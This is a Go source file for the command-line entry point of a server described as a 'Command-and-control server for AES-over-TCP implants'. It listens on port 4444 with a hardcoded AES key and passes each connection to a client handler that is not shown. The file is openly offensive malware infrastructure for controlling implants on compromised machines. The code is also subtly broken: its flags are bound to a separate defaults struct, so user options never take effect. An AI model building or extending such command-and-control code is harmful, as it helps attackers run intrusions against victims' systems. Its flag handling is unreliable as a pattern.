package cmd

import (
	"fmt"
	"net"
	"os"

	"github.com/spf13/cobra"
)

type CliOptions struct {

	// Port to listen on
	Lport int

	// Enable debug trace
	DebugEnabled bool

	// AES-key to use for communications
	AesKey string
}

func CliDefaults() *CliOptions {

	return &CliOptions{
		Lport:        4444,
		DebugEnabled: false,
		AesKey:       "RAZINrazinRAZINrazinRAZINrazinRAZINraz",
	}
}

func LoadServerCLI(opts *CliOptions) *cobra.Command {

	version := "0.0.1"
	var cmd = &cobra.Command{
		Use:                "server",
		Version:            version,
		DisableSuggestions: true,
		Short:              "AES-over-TCP server",
		Long:               "Command-and-control server for AES-over-TCP implants",
		Run: func(cmd *cobra.Command, args []string) {

			if opts.DebugEnabled {
				fmt.Println("[~] Setting up server...")
			}

			/* setting up listener */
			connexion, err := net.Listen("tcp", fmt.Sprintf(":%d", opts.Lport))
			if err != nil {
				fmt.Printf("[!] Cannot listen on port %d: %s\n", opts.Lport, err.Error())
				os.Exit(1)
			}
			defer connexion.Close()

			/* wait for new connections */
			for {

				conn, err := connexion.Accept()
				if err != nil {
					fmt.Printf("[!] Error accepting connexion: %s\n", err.Error())
					continue
				}

				/* call go handler in co-routine */
				go handleClient(opts, conn)
			}
		},
	}

	defaults := CliDefaults()

	cmd.PersistentFlags().BoolVarP(&defaults.DebugEnabled, "debug", "d", false, "enable debug trace")
	cmd.PersistentFlags().IntVarP(&defaults.Lport, "port", "p", 4444, "default listening port")
	cmd.PersistentFlags().StringVarP(&defaults.AesKey, "key", "k", defaults.AesKey, "default AES key for communications")

	return cmd
}
